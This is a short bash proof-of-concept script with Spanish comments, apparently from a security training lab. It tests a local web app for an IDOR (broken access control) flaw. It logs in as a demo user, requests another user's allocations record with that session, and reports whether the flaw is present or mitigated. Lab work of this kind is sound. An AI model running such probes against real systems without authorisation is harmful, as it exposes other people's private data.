#!/usr/bin/env bash
# V1 — Broken Access Control (IDOR). Dueño: JuanFra. OWASP A01:2025.
# Uso: SOLO contra la instancia LOCAL.
#   POC_PASS=<clave_user1> ./poc-scripts/v1_idor.sh                             # :4000 vulnerable
#   BASE=http://localhost:4001 POC_PASS=<clave_user1> ./poc-scripts/v1_idor.sh  # :4001 mitigada
# Variables: BASE, POC_USER (def. user1), POC_PASS (obligatoria), OWN_ID (def. 2), OTHER_ID (def. 3)
# Salida: 0 = mitigado, 1 = vulnerable, 2 = error
set -euo pipefail

BASE="${BASE:-http://localhost:4000}"
POC_USER="${POC_USER:-user1}"
POC_PASS="${POC_PASS:?define POC_PASS (clave demo de user1, ver db-reset.js)}"
OWN_ID="${OWN_ID:-2}"
OTHER_ID="${OTHER_ID:-3}"

JAR="$(mktemp)"; BODY="$(mktemp)"
trap 'rm -f "$JAR" "$BODY"' EXIT

echo "[V1] objetivo: $BASE  usuario: $POC_USER  (fecha: $(date -u +%FT%TZ))"

# 1. Login legítimo y guardado de la cookie de sesión
code=$(curl -s -o /dev/null -w "%{http_code}" -c "$JAR" \
  --data-urlencode "userName=$POC_USER" --data-urlencode "password=$POC_PASS" "$BASE/login")
echo "[V1] POST /login -> $code"
if [ "$code" != "302" ]; then
  echo "[V1] ERROR: login fallido (se esperaba 302)"; exit 2
fi

names() { grep -o 'Asset Allocations for [^<]*' "$BODY" || true; }

# 2. Recurso propio
own_code=$(curl -s -b "$JAR" -o "$BODY" -w "%{http_code}" "$BASE/allocations/$OWN_ID")
own_names=$(names)
echo "[V1] GET /allocations/$OWN_ID (propio) -> $own_code | ${own_names:-<sin datos>}"

# 3. Recurso de OTRO usuario con la sesión propia
oth_code=$(curl -s -b "$JAR" -o "$BODY" -w "%{http_code}" "$BASE/allocations/$OTHER_ID")
oth_names=$(names)
echo "[V1] GET /allocations/$OTHER_ID (ajeno)  -> $oth_code | ${oth_names:-<sin datos>}"

# 4. Veredicto: vulnerable si entrega datos distintos a los propios
if [ "$oth_code" = "200" ] && [ -n "$oth_names" ] && [ "$oth_names" != "$own_names" ]; then
  echo "[V1] RESULTADO: VULNERABLE - se leyeron datos de otro usuario (A01:2025)"
  exit 1
fi
echo "[V1] RESULTADO: MITIGADO - no se entregan datos de otro usuario"
exit 0
